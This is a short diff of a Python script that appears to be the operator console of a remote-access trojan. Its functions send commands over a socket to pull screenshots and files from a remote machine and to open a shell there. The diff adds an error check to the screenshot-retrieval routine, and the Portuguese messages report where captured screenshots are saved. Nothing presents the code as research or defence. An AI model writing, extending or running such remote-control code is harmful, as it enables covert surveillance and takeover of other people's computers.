@@ -111,15 +111,19 @@ def download(s):
 def screenshot(s):
     s.send('5')
     retorno = s.recv(1024)
-    nome = retorno.split('+/-')[0]
-    nome = nome.replace('/tmp/', os.path.expanduser('~')+'/Desktop/')
-    f = open(nome , 'wb')
-    l = retorno.split('+/-')[1]
-    while(l):
-        f.write(l)
-        l = s.recv(1024)
-    f.close()
-    print('Screenshot salvo na sua area de trabalho')
+    if(retorno):
+        nome = retorno.split('+/-')[0]
+        nome = nome.replace('/tmp/', os.path.expanduser('~')+'/Desktop/')
+        f = open(nome , 'wb')
+        l = retorno.split('+/-')[1]
+        while(l):
+            f.write(l)
+            l = s.recv(1024)
+        f.close()
+        print('Screenshot salvo na sua area de trabalho')
+    else:
+        print('error continuando')
+
 
 def shell(s):
     s.send('2') # shell
